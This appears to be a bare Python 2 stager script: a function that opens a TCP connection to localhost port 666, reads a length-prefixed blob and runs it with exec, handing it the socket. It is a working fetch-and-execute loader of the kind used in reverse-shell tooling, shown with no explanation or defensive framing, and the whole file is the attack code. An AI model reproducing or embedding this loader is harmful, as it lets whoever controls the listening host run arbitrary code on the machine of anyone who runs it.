import socket,struct


def ran():
	print "[ + ] Connection [ + ]"
	s=socket.socket(2,socket.SOCK_STREAM)
	s.connect(('127.0.0.1',666))
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(l)
	while len(d)<l:
		d+=s.recv(l-len(d))
	exec(d,{'s':s})
